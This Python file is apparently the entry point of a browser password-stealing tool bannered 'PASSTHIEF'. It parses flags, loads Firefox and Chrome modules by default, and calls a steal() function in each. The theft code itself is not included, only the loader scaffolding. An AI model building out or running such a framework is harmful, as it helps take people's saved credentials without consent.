# -*- coding: utf-8
from importlib import import_module
# 3rd-party
import colorama as Color
from colorama import Fore,Back,Style
# Print banner
def PrintBanner():
	print('''
	{red}██████╗  █████╗ ███████╗███████╗████████╗██╗  ██╗██╗███████╗███████╗{reset}
	{yellow}██╔══██╗██╔══██╗██╔════╝██╔════╝╚══██╔══╝██║  ██║██║██╔════╝██╔════╝{reset}
	{bright}{yellow}██████╔╝███████║███████╗███████╗   ██║   ███████║██║█████╗  █████╗{reset}
	{green}██╔═══╝ ██╔══██║╚════██║╚════██║   ██║   ██╔══██║██║██╔══╝  ██╔══╝{reset}
	{blue}██║     ██║  ██║███████║███████║   ██║   ██║  ██║██║███████╗██║{reset}
	{pink}╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝╚═╝{reset}
	{bright}Version {green}{ver}{white}
	'''.format(ver=VersionInfo.GetInfo(),
							red=Fore.RED,
							yellow=Fore.YELLOW,
							green=Fore.GREEN,
							blue=Fore.BLUE,
							pink=Fore.MAGENTA,
							white=Fore.WHITE,
							reset=Style.RESET_ALL,
							bright=Style.BRIGHT
							)
	)
# Constants
class VersionInfo(object):
	# Returns the version info
	@staticmethod
	def GetInfo():
		return "%d.%d.%d" % (VersionInfo.GetMajor(),VersionInfo.GetMinor(),VersionInfo.GetRevision())
	# Returns the major version number
	@staticmethod
	def GetMajor():
		return 0
	# Returns the minor version number
	@staticmethod
	def GetMinor():
		return 1
	# Returns the revision number
	@staticmethod
	def GetRevision():
		return 0
# Tidy up the args
def ParseArgs(argv):
	# Remove first element from the argv
	argv.pop(0)
	# Firefox and Chrome are default
	argv.append("--firefox")
	argv.append("--chrome")
	# Remove duplicates
	print("{green}[*]{white} Checking modules:\n".format(green=Fore.GREEN,
													     white=Fore.WHITE))
	# Clean the already bad ones
	argv = list(sorted(set(argv)))
	for arg in argv:
		if len(arg.split("--")) == 1:
			argv.remove(arg)
	# Add the module path
	for i in range(0,len(argv)):
			argv[i] = "modules.%s" % argv[i].split("--")[1].lower()
	# Return argv
	return argv
# Import all modules
def LoadModules(argv):
	modules = list()
	for _ in range(0,len(argv)):
		try:
			modules.append(import_module(argv[_]))
		except ImportError as e:
			#reason = repr(e).split("ImportError('No module named ")[1].split("'")[0]
			reason = repr(e)
			print("{red}[x]{white} Module not loaded: {blue}{name}{white}\nUnsupported 3rd party library: {reason}".format(name=GetModuleName(argv[_]),
																				 		  								   red=Fore.RED,
																				 	  	  			  					   white=Fore.WHITE,
																				 	  	  			  					   blue=Fore.BLUE,
																						  						  		   reason=reason))
	return modules
# Get uppercase name
def GetModuleName(mod):
	mod = mod.split("modules.")[1]
	mod = mod.split("\'")[0]
	mod = list(mod)
	if len(mod) != 1:
		mod[0] = mod[0].upper()
	return ''.join(mod)
# Remove all bad modules
def CheckModules(mods):
	for m in reversed(list(mods)):
		# Each module must have a steal function which will be called
		if hasattr(m,'steal'):
			print("{green}[*]{white} Loaded module: {blue}{name}{white}".format(name=GetModuleName(repr(m)),
																   		   		green=Fore.GREEN,
																   		   		white=Fore.WHITE,
																		   		blue=Fore.BLUE))
		else:
			print("{red}[x]{white} Error loading module: {blue}{name}{white}".format(name=GetModuleName(repr(m)),
																			   		 red=Fore.RED,
																			   		 white=Fore.WHITE,
																			   		 blue=Fore.BLUE))
			mods.remove(m)
	return mods

# Call all the modules
def CallModules(mods):
	for m in mods:
		print("-{blue}{name}{white}:".format(name=GetModuleName(repr(m)),
											white=Fore.WHITE,
											blue=Fore.BLUE))
		m.steal()
